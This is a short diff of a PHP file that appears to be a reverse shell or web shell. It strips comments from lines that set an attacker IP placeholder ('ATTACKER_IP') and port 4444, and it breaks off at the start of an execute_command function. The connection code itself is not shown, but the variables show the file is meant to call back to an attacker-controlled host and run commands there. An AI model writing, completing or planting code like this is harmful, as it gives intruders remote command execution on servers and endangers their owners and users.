@@ -1,7 +1,7 @@
 <?php
-// Configuration
-$attacker_ip = 'ATTACKER_IP'; // Replace with the IP address of the attacker's machine
-$attacker_port = 4444; // Replace with the port you want to use
+
+$attacker_ip = 'ATTACKER_IP';
+$attacker_port = 4444; 
 
 function execute_command($command) {
     $output = [];
